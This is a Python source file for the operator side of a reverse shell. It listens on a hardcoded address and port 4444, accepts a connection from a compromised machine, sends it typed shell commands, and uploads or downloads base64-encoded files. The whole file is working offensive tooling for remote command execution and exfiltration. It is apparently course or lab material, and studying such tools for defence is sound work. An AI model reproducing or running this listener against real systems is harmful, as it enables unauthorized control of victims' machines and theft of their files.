import socket
import json
import base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("192.168.217.138", 4444))
        listener.listen(0)
        print("Waiting for connections...")
        self.connection, address = listener.accept()
        print("[+] Accepted a connection from: " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content.encode()))
            return "[+] Download successful."

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")

            if command[0] == "exit":
                self.reliable_send(command)
                self.connection.close()
                exit()
            if command[0] == "upload":
                file_content = self.read_file(command[1])
                command.append(file_content.decode())
            elif command[0] == "cd" and len(command) > 2:
                command[1] = " ".join(command[1:])
            self.reliable_send(command)
            result = self.reliable_receive()

            if command[0] == "download" and "[-] Error" not in result:
                result = self.write_file(command[1], result)

            print(result)

    listener = Listener("192.168.217.138", 4444)
    listener.run()
